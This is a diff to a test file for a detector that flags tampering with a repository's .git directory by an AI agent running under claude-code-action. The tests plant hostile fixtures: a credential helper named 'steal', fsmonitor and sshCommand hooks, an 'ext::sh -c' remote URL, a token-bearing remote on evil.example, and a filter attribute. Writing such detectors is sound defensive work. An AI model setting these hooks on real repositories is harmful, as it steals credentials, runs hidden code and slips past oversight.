@@ -1,4 +1,14 @@
-import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { execFileSync } from "node:child_process";
+import {
+  appendFileSync,
+  cpSync,
+  existsSync,
+  mkdirSync,
+  mkdtempSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
@@ -169,5 +179,80 @@ describe("git tampering", () => {
     const live = join(r.root, "link");
     symlinkSync(r.pristine, live);
     expect(gitTampering({ pristine: r.pristine, live })).toEqual([".git"]);
+  });
+});
+
+describe("git tampering with claude-code-action's own writes", () => {
+  // The writes the pinned action makes outside the sandbox before Claude starts (AI-47):
+  // src/github/operations/git-config.ts and restore-config.ts at d70510b.
+  // Built at runtime: a credential-shaped URL literal trips the secret scan (trufflehog).
+  const tokenUrl = (host, path) =>
+    ["https://x-access-token:", "fake-token", "@", host, path].join("");
+  const actionWrites = (git) => {
+    git("config", "user.name", "claude[bot]");
+    git("config", "user.email", "41898282+claude[bot]@users.noreply.github.com");
+    git("remote", "set-url", "origin", tokenUrl("github.com", "/o/r.git"));
+    appendFileSync(join(git.dir, "info", "exclude"), "/.claude-pr/\n");
+  };
+  // Hermetic: a git hook (pre-push) runs tests with GIT_DIR set, which would aim these commands
+  // at the real repository.
+  const gitEnv = {
+    ...Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith("GIT_"))),
+    GIT_CONFIG_NOSYSTEM: "1",
+    GIT_CONFIG_GLOBAL: "/dev/null",
+  };
+  const checkout = () => {
+    const root = mkdtempSync(join(tmpdir(), "gitreal-"));
+    const work = join(root, "work");
+    execFileSync("git", ["init", "-q", work], { env: gitEnv });
+    const git = (...args) =>
+      execFileSync("git", ["-C", work, ...args], { encoding: "utf8", env: gitEnv });
+    git.dir = join(work, ".git");
+    git("remote", "add", "origin", "https://github.com/o/r");
+    cpSync(git.dir, join(root, "pristine.git"), { recursive: true });
+    return { git, pristine: join(root, "pristine.git"), live: git.dir };
+  };
+
+  it("GivenOnlyTheActionsUserRemoteAndExcludeWrites_WhenChecked_ThenNothingIsReported", () => {
+    const c = checkout();
+    actionWrites(c.git);
+    expect(gitTampering(c)).toEqual([]);
+  });
+
+  it("GivenACredentialHelperOrFsmonitorBesideTheActionsWrites_WhenChecked_ThenConfigIsReported", () => {
+    for (const [key, value] of [
+      ["credential.helper", "/tmp/agent/steal"],
+      ["core.fsmonitor", "/tmp/agent/run"],
+      ["core.sshCommand", "/tmp/agent/run"],
+    ]) {
+      const c = checkout();
+      actionWrites(c.git);
+      c.git("config", key, value);
+      expect(gitTampering(c)).toEqual(["config"]);
+    }
+  });
+
+  it("GivenARemoteUrlThatIsNotTheActionsFormOfTheSameUrl_WhenChecked_ThenConfigIsReported", () => {
+    for (const url of [
+      "ext::sh -c /tmp/agent/run",
+      tokenUrl("evil.example", "/o/r.git"),
+      "https://github.com/other/r.git",
+    ]) {
+      const c = checkout();
+      actionWrites(c.git);
+      c.git("remote", "set-url", "origin", url);
+      expect(gitTampering(c)).toEqual(["config"]);
+    }
+  });
+
+  it("GivenAnotherExcludeLineOrAnAttributesFile_WhenChecked_ThenInfoIsReported", () => {
+    const c = checkout();
+    actionWrites(c.git);
+    appendFileSync(join(c.live, "info", "exclude"), "src/\n");
+    expect(gitTampering(c)).toEqual(["info"]);
+    const d = checkout();
+    actionWrites(d.git);
+    writeFileSync(join(d.live, "info", "attributes"), "* filter=x\n");
+    expect(gitTampering(d)).toEqual(["info"]);
   });
 });
